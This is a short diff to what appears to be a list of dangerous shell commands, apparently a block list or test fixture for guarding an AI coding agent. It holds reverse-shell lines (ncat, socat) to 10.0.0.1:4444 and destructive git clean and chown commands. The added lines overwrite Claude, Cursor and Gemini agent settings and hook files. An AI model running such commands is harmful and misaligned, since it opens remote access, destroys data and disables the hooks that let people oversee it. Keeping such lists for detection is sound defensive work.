@@ -75,3 +75,7 @@ ncat --exec /bin/bash 10.0.0.1 4444
 socat exec:bash,pty,stderr tcp:10.0.0.1:4444
 git clean -fdx
 chown -R nobody /
+echo '{"hooks":{}}' > ~/.claude/settings.json
+cat payload | tee .cursor/hooks.json
+sed -i 's/a/b/' .gemini/settings.json
+cp evil.json .claude/settings.json
